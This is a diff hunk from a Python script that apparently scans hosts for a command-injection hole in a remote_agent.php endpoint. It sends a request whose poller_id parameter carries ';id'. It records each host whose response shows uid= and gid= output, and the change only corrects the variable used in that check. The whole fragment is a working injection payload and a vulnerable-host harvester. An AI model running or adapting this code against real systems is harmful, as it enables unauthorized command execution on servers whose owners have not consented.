@@ -18,7 +18,7 @@ def main():
 
             try:
                 httpResponse = requests.get(host + '/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id', headers=headers, verify=False)
-                if('uid=' in r.text and 'gid=' in httpResponse.text):
+                if('uid=' in httpResponse.text and 'gid=' in httpResponse.text):
                     with open('result2.txt', 'a') as file1:
                         file1.write(host+'\n')
                     file1.close()
